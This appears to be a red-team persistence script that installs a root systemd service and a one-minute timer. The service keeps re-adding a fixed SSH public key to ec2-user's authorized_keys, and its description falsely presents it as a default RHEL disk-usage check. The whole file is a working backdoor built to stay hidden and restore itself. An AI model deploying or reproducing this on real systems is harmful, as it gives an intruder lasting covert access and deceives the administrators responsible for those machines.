#!/bin/bash

# Team Eagle - APT creation script to add an SSH key for ec2-user via systemd
# This script is a simple APT that will add a predefined SSH key to the authorized_keys
# of ec2-user via a stealthy systemd service and timer.

DAEMON_NAME="cond"
TARGET_USER="ec2-user"
SERVICE_FILE="/etc/systemd/system/${DAEMON_NAME}.service"
TIMER_FILE="/etc/systemd/system/${DAEMON_NAME}.timer"
SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBpv/nnfTgZsZnEIUQvd9h/BIF8yxCr7zjOADstvC+EH egp1042@egp1042m5"
PAYLOAD="grep -q '$SSH_KEY' /home/$TARGET_USER/.ssh/authorized_keys || echo '$SSH_KEY' >> /home/$TARGET_USER/.ssh/authorized_keys 2>/dev/null"

# Create the service
cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=A default RHEL system service that ensures disk usage is lower than 0.9/1.0

[Service]
Type=oneshot
ExecStart=/bin/bash -c "$PAYLOAD"
User=root
EOF

# Create the timer
cat <<EOF > "$TIMER_FILE"
[Unit]
Description=Runs $DAEMON_NAME service every minute

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=$DAEMON_NAME.service

[Install]
WantedBy=timers.target
EOF

# Ensure the service and timer are owned by root
chown root:root "$SERVICE_FILE" "$TIMER_FILE"
chmod 644 "$SERVICE_FILE" "$TIMER_FILE"

# Enable
systemctl daemon-reload
systemctl enable --now "$DAEMON_NAME.timer"
